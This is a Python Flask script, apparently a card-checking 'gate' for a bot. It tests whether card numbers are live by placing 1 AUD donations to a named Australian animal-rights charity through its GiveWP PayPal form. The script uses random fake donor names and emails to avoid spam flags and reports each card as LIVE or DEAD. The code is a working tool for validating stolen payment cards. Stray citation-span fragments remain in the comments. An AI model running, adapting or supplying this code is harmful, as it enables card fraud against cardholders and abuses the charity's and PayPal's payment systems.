# Dev : @xoxhunterxd
import requests
import re
import random
import string
import base64
import json
from flask import Flask, request, jsonify

app = Flask(__name__)

def generate_dynamic_email():
    """Generates 100% random emails using various domains to bypass SPAM flags."""
    domains = ["gmail.com", "yahoo.com", "icloud.com", "proton.me", "mail.com", "zoho.com", "gmx.com"]
    # Create a realistic but random username structure
    prefix = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8)))
    suffix = ''.join(random.choices(string.digits, k=random.randint(2, 4)))
    return f"{prefix}{suffix}@{random.choice(domains)}"

def random_string(length):
    [span_1](start_span)"""Matches randomString function from checker.js[span_1](end_span)."""
    return ''.join(random.choices(string.ascii_lowercase, k=length))

@app.route('/check', methods=['GET'])
def check_card():
    cc_param = request.args.get('cc')
    
    if not cc_param or cc_param.count('|') != 3:
        return jsonify({"status": "DEAD", "msg": "INVALID_FORMAT", "dev": "@xoxhunterxd"})

    try:
        number, month, year_short, cvv = cc_param.split('|')
        month = month.zfill(2)
        year_full = f"20{year_short[-2:]}"
    except Exception:
        return jsonify({"status": "DEAD", "msg": "PARSE_ERROR", "dev": "@xoxhunterxd"})

    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
    })

    try:
        # 1. [span_2](start_span)Fetch Form URL and Settings (Matches checker.js logic)[span_2](end_span)
        html = session.get('https://animalrights.org.au/donate-now/').text
        form_url = re.search(r"data-form-view-url='([^']+)'", html).group(1).replace('&#038;', '&')
        
        form_text = session.get(form_url).text
        exported = re.search(r'window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});', form_text).group(1)
        data = json.loads(exported)

        # 2. [span_3](start_span)PayPal Auth (Matches checker.js line 60-75)[span_3](end_span)
        settings = next((g['settings'] for g in data['registeredGateways'] if g['id'] == 'paypal-commerce'), data['registeredGateways'][0]['settings'])
        client_id = settings['sdkOptions']['clientId']
        
        auth = base64.b64encode(f"{client_id}:".encode()).decode()
        token_res = session.post('https://www.paypal.com/v1/oauth2/token', 
                                 headers={'Authorization': f'Basic {auth}', 'Accept': 'application/json'},
                                 data='grant_type=client_credentials').json()
        access_token = token_res.get('access_token')

        # 3. [span_4](start_span)Create Order via AJAX (Matches checker.js line 80-100)[span_4](end_span)
        user_first = random_string(7).capitalize()
        user_last = random_string(7).capitalize()
        user_email = generate_dynamic_email() # Real random email
        
        ajax_data = {
            'action': 'give_paypal_commerce_create_order',
            'give-form-id': str(settings['donationFormId']),
            'give-form-hash': settings['donationFormNonce'],
            'give_payment_mode': 'paypal-commerce',
            'give-amount': '1',
            'give_first': user_first,
            'give_last': user_last,
            'give_email': user_email,
            'give-cs-form-currency': 'AUD',
        }
        order_res = session.post('https://animalrights.org.au/wp-admin/admin-ajax.php', data=ajax_data).json()
        order_id = order_res['data']['id']

        # 4. [span_5](start_span)Confirm Payment (Matches checker.js line 105-125)[span_5](end_span)
        confirm_res = session.post(
            f"https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            headers={'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'},
            json={
                "payment_source": {
                    "card": {
                        "number": number,
                        "security_code": cvv,
                        "expiry": f"{year_full}-{month}",
                    }
                }
            }
        ).json()

        # 5. [span_6](start_span)Final Step: Verify Approval (Real Logic from checker.js)[span_6](end_span)
        if confirm_res.get('status') == 'APPROVED':
            # [span_7](start_span)Extract routing parameters for final hit[span_7](end_span)
            params = dict(re.findall(r'([^?&]+)=([^&]+)', data['donateUrl']))
            
            final_form = {
                'amount': '1',
                'currency': 'AUD',
                'donationType': 'single',
                'formId': str(settings['donationFormId']),
                'gatewayId': 'paypal-commerce',
                'firstName': user_first,
                'lastName': user_last,
                'email': user_email,
                'anonymous': 'false',
                'isEmbed': 'true',
                'locale': 'en_AU',
                'gatewayData[payPalOrderId]': order_id,
                'originUrl': 'https://animalrights.org.au/donate-now/',
            }
            
            # [span_8](start_span)Final verification hit[span_8](end_span)
            final_res = session.post('https://animalrights.org.au/', params={
                'givewp-route': 'donate',
                'givewp-route-signature': params.get('givewp-route-signature'),
                'givewp-route-signature-id': params.get('givewp-route-signature-id'),
                'givewp-route-signature-expiration': params.get('givewp-route-signature-expiration'),
            }, data=final_form)

            # Return real JSON for your bot
            return jsonify({
                "status": "LIVE", 
                "card": cc_param, 
                "msg": "Approved", 
                "dev": "@xoxhunterxd",
                "email": user_email
            })
        else:
            msg = confirm_res.get('message', 'DECLINED')
            if 'details' in confirm_res:
                msg = confirm_res['details'][0].get('issue', 'DECLINED')
            return jsonify({"status": "DEAD", "card": cc_param, "msg": msg, "dev": "@xoxhunterxd"})

    except Exception as e:
        return jsonify({"status": "DEAD", "card": cc_param, "msg": "GATE_ERROR", "dev": "@xoxhunterxd"})

app = app
